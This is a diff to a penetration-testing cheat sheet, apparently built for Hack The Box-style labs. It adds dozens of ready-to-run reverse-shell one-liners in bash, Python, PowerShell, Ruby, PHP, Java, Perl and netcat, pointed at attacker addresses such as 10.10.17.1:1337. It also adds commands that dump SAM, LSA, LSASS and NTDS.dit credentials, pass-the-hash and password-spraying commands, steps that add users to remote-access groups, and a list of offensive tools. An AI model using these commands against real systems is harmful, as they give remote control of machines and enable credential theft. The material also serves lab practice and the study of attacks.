@@ -83,17 +83,117 @@ TTL 64 = Linux
 nmap -O <ip>
 ```
 
+## Reverse Shells
 
-### Services
+Bash
+```shell
+/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+sh -i >& /dev/tcp/<ip>/<port> 0>&1
+/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1
+bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+sh -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+bash -c 'sh -i >& /dev/tcp/<ip>/<port> 0>&1'
+sh -c 'sh -i >& /dev/tcp/<ip>/<port> 0>&1'
+/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1'
+/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' #
+/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' ;
+setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+setsid /bin/bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1'
+setsid /bin/bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1' #
+setsid /bin/bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1' ;
+setsid /bin/sh -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+```
 
-####  21/TCP - FTP
+Python
 
-#### 22/TCP - SSH
+```python
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<ip>",<port>)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+```
 
-#### 25,465,587/TCP - SMTP
+Powershell
+
+ 
+```shell
+$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream(); [byte[]]$bt=0..255|%{0}; while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i); $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1)); $sm.Write($st,0,$st.Length)}
+```
 
 
-##### SMTP User Enumeration
+```shell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.0',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```shell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.0', 1234)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % { 0 }
+
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex ". { $data } 2>&1" | Out-String)
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+
+$client.Close()
+```
+
+
+Ruby 
+
+```shell
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337"); while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
+```
+
+```shell
+ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+PHP
+```shell
+php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Java
+```shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;
+cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+Perl 
+```shell
+perl -e 'use Socket;$i="10.10.17.1";$p=1337; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S");open(STDERR,">&S"); exec("/bin/sh -i");};'
+```
+Netcat
+
+```shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
+```
+
+
+## Services
+
+###  21/TCP - FTP
+
+### 22/TCP - SSH
+
+```shell
+❯ ssh <user>@<ip> 
+```
+
+
+
+### 25,465,587/TCP - SMTP
+
+
+#### SMTP User Enumeration
 
 ```shell
 ❯ smtp-user-enum -M VRFY -U <users> -t <ip>
@@ -101,33 +201,86 @@ nmap -O <ip>
 
 
 
-#### 53/TCP|UDP - DNS
+### 53/TCP|UDP - DNS
 
-#### 80/TCP - HTTP & 443/TCP - HTTPS
+### 80/TCP - HTTP & 443/TCP - HTTPS
 
-#### 88/TCP - Kerberos
+#### Directory Fuzzing
 
-##### Kerberos User Enumeration
+ffuf 
+
+gobuster
+
+dirbuster
+
+dirsearch
+
+feroxbuster
+
+wfuzz
+
+
+#### Subdomain Enumeration
+
+
+fuff 
+
+
+wfuzz
+
+
+gobuster
+
+
+#### SQL Injection
+
+#### Cross-Site Scripting (XSS)
+
+#### Cross-site Request Forgery (CSRF)
+
+#### Command Injection
+
+#### Directory/Path Traversal
+
+#### File Upload
+
+#### Information Disclousure
+
+#### Local File Inclusion
+
+#### Remote File Inclusion
+
+#### Server Side Template Injection
+
+#### Server-side Request Forgery
+
+
+
+
+
+### 88/TCP - Kerberos
+
+#### Kerberos User Enumeration
 
 
 ```shell
 ❯ kerbrute userenum --dc <dc> -d <domain> <users>
 ```
 
-#### 111,135,593/TCP - RPC
+### 111,135,593/TCP - RPC
 
-#### 123/TCP - NTP
+### 123/TCP - NTP
 
-#### 139,445/TCP - SMB
+### 139,445/TCP - SMB
 
-##### SMB Share Enumeration
+#### SMB Share Enumeration
 
 ```shell
 ❯ netExec smb <ip> -u guest -p '' --shares # Guest auth
 ❯ netExec smb <ip> -u '' -p '' --shares # Null auth
 ```
 
-##### SMB Users Enumeration
+#### SMB Users Enumeration
 
 ```shell
 ❯ netexec smb <ip> -u <user> -p <password> --users # Simple auth
@@ -135,14 +288,14 @@ nmap -O <ip>
 ❯ netexec smb <ip> -u '' -p '' --users # Null auth
 ```
 
-##### SMB Password Spraying
+#### SMB Password Spraying
 
 ```shell
 ❯ NetExec smb <ip> -u <users> -p <passwords> --continue-on-success
 ```
 
 
-##### SMB RID Cycling
+#### SMB RID Cycling
 
 ```shell
 ❯ netexec smb <ip> -u <user> -p <password> --rid-brute # Simple auth
@@ -152,7 +305,7 @@ nmap -O <ip>
 
 
 
-##### Download Recursively SMB Share
+#### Download Recursively SMB Share
 
 ```shell
 ❯ smbclient \\\\<ip>\\<share> <user>%<password>
@@ -167,25 +320,25 @@ smb: \> lcd <local-path>
 smb: \> mget *
 ```
 
-##### Generate Hosts File over SMB
+#### Generate Hosts File over SMB
 
 ```shell
 ❯ NetExec smb <ip> --generate-hosts-file <outfile>
 ```
 
-##### Generate KRB5 File over SMB
+#### Generate KRB5 File over SMB
 
 ```shell
 ❯ netexec smb <ip> -u <user> -p <password> -k --generate-krb5-file krb5.conf
 ```
 
-##### Pass-The-Hash
+#### Pass-The-Hash
 
 ```shell
 ❯ netexec smb <ip> -u <user> -H <nthash>
 ```
 
-##### Abuse SMB Status Response
+#### Abuse SMB Status Response
 
 
 - **STATUS_PASS_MUST_CHANGE** 
@@ -209,7 +362,7 @@ smb: \> mget *
 
 
 
-#### 161,162/UDP - SNMP 
+### 161,162/UDP - SNMP 
 
 ```shell
 ❯ snmpbulkwalk -v2c -c internal <ip>
@@ -220,9 +373,50 @@ smb: \> mget *
 snmpbrute -t <ip>
 ```
 
-#### 389,636,3268,3269/TCP - LDAP
+### 389,636,3268,3269/TCP - LDAP
 
-#### 3389/TCP - RDP
+#### Enumerate all domain users
+netexec
+```shell
+❯ netexec ldap <ip> -u <user> -p <password> --query "(sAMAccountName=*)" "" # Simple auth
+❯ netexec ldap <ip> -u guest -p '' --query "(sAMAccountName=*)" "" # Guest auth
+❯ netexec ldap <ip> -u '' -p '' --query "(sAMAccountName=*)" "" # Null auth
+```
+
+#### Retrieve the objectClass attribute
+
+ldapsearch
+```shell
+❯ ldapsearch -H ldap://<ip> -x -b "DC=domain,DC=local"
+```
+
+
+### 2049/TCP - NFS
+
+List shares
+```shell
+showmount -e <ip>
+```
+
+Mount share
+```shell
+mount -t nfs <ip>:/share /mnt/share
+```
+
+### 3389/TCP - RDP
+
+Add user to `Remote Desktop Users` group.
+
+**CMD**
+```shell
+C:\> net localgroup "Remote Desktop Users" <user> /add
+```
+
+**Powershell**
+```shell
+PS C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member <user>
+```
+
 
 Simple auth
 ```shell
@@ -251,18 +445,97 @@ xfreerdp /v:<ip> /u:<user> /p:<password> /d:<domain> /cert-ignore /f +clipboard 
 ```
 
 
-#### 5985,5986/TCP - WinRM
+### 5985,5986/TCP - WinRM
+
+Add user to `Remote Management Users` group.
+
+CMD
+```shell
+C:\> net localgroup "Remote Management Users" <user> /add
+```
+
+Powershell
+```shell
+PS C:\> Add-LocalGroupMember -Group "Remote Management Users" -Member <user>
+```
+
+#### Connect to WinRM
+
+evil-winrm
+```shell 
+❯ evil-winrm -i <ip> -u <user> -p <password>
+```
+
+- File Upload and Download
+```shell
+*Evil-WinRM* PS C:\> upload <file>
+*Evil-WinRM* PS C:\> download <file> <kali-filepath> # Kali Filepath Optional
+```
+
+**evil-wirnm-py** 
+```shell
+❯ evil-winrm-py -i <ip> -u <user> -p <password>
+```
+
+
+evil-winrm.rb
+```shell
+❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -p <password>
+```
+
+Load powershell scripts Directory
+```shell
+❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -s <directory> -p <password>
+```
+
+#### Pass-The-Hash
+
+```shell
+❯ evil-winrm -i <ip> -u <user> -H <nthash>
+❯ evil-winrm-py -i <ip> -u <user> -H <nthash>
+❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -H <nthash>
+```
+
 
 # Linux
 
-## Linux Privilege Escalation
+## Linux Post Exploitation
 
-### Looking for Sensitive Information
+### TTY Treatment
 
-### Cron Jobs
+**Bash**
+```shell
+victim@machine:~$ script /dev/null -c bash
+^Z
+
+❯ stty raw -echo; fg
+		reset xterm
+									
+									
+victim@machine:~$ export TERM=xterm
+victim@machine:~$ export SHELL=bash
+```
+
+**Python**
+```shell
+victim@machine:~$ python -c 'import pty; pty.spawn("/bin/bash")'
+^Z
+
+❯ stty raw -echo; fg
+		reset xterm
+									
+victim@machine:~$ export TERM=xterm
+victim@machine:~$ export SHELL=bash
+```
+
+### Linux Privilege Escalation
+
+#### Looking for Sensitive Information
+
+#### Cron Jobs
 
 
-### Abuse SUDOERS
+#### Abuse SUDOERS
 
 Sudoers File Location: `/etc/sudoers`
 
@@ -294,7 +567,7 @@ Structures:
 
 
 
-### Capabilities
+#### Capabilities
 
 
 
@@ -313,7 +586,7 @@ $ getcap -r / 2>/dev/null
 
 
 
-### Abuse Groups
+#### Abuse Groups
 
 ##### lxc/lxd
 
@@ -331,35 +604,86 @@ $ getcap -r / 2>/dev/null
 
 ##### root
 
-### SUID
+#### SUID
 
 ```shell
 $ find / -perm -4000 -ls 2>/dev/null
 $ find / -perm -u=s -type f 2>/dev/null
 ```
 
-### Kernel Exploitation
+#### Kernel Exploitation
 
 ```shell 
 $ uname -vr
 ```
 
-### Abuse Weak File Permissions
+#### Abuse Weak File Permissions
 
-### Source Code Analysis
+#### Source Code Analysis
 
-### Library Hijacking
-
-
+#### Library Hijacking
 
 
-### Automated Tools
 
 
-## Windows Privilege Escalation
+#### Automated Tools
+
+# Windows
+
+## Windows Post Exploitation
+
+### Windows Privilege Escalation
 
 
-### Local Credential Dumping
+#### Local Credential Dumping
+
+#### SAM 
+
+netexec
+```shell
+netexec smb <ip> -u <user> -p <password> --sam
+```
+
+#### LSA 
+
+netexec
+```shell
+netexec smb <ip> -u <user> -p <password> --lsa
+```
+
+
+#### LSASS
+
+netexec
+```shell
+netexec smb <ip> -u <user> -p <password> -M nanodump
+```
+
+#### Notepad
+
+
+netexec
+```shell
+netexec smb <ip> -u <user> -p <password> -M notepad
+netexec smb <ip> -u <user> -p <password> -M notepad++
+```
+
+#### Powershel History
+
+##### Linux
+
+netexec
+```shell
+netexec smb <ip> -u <user> -p <password> -M powershell_history
+```
+
+##### Windows
+
+Principal Location
+
+`C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+
 
 #### Autologon Password
 
@@ -398,15 +722,6 @@ Practice lab: Puppy (HTB)
 
 
 
-#### NTDS.dit 
-
-
-
-
-
-```shell
-C:\programdata> diskshadow /s C:\programdata\backup
-```
 
 
 
@@ -672,6 +987,17 @@ Kerberoasting
 
 #### LAPS
 
+##### Linux
+
+netexec
+
+```shell
+netexec ldap <ip> -u <user> -p <password> -M laps
+```
+
+
+##### Windows
+
 ```shell
 PS C:\> net user svc_deploy
 User name                    svc_deploy
@@ -695,3 +1021,59 @@ Name              : DC01
 ...
 ```
 Practice lab: Timelaps (HTB), StreamIO (HTB)
+
+#### NTDS.dit 
+
+##### Linux
+
+**netexec**
+```shell
+netexec smb <ip> -u <user> -p <password> --ntds
+```
+
+
+
+##### Windows
+
+```shell
+C:\programdata> diskshadow /s C:\programdata\backup
+```
+
+
+### Kali Linux Helpful Tools
+
+```shell
+/usr/bin/winpeas
+/usr/bin/ncat-w32
+/usr/bin/windows-resources
+/usr/bin/apple-bleee
+/usr/bin/exploitdb-papers
+/usr/bin/jsp-file-browser
+/usr/bin/sharpcollection
+/usr/bin/laudanum
+/usr/bin/powersploit
+/usr/bin/htshells
+/usr/bin/b374k
+/usr/bin/mimikatz
+/usr/bin/kerberoast
+/usr/bin/sprayingtoolkit
+/usr/bin/exploitdb
+/usr/bin/rubeus
+/usr/bin/exploitdb-bin-sploit
+/usr/bin/ligolo-ng-common-binaries
+/usr/bin/wce
+/usr/bin/heartleech
+/usr/bin/linpeas
+/usr/bin/windows-binaries
+/usr/bin/wordlists
+/usr/bin/webshells
+/usr/bin/nishang
+/usr/bin/framework2
+/usr/bin/wotmate
+/usr/bin/windows-privesc-check
+/usr/bin/peass
+/usr/bin/pspy-binaries
+/usr/bin/chisel-common-binaries
+/usr/bin/seclists
+/usr/bin/payloadsallthethings
+```
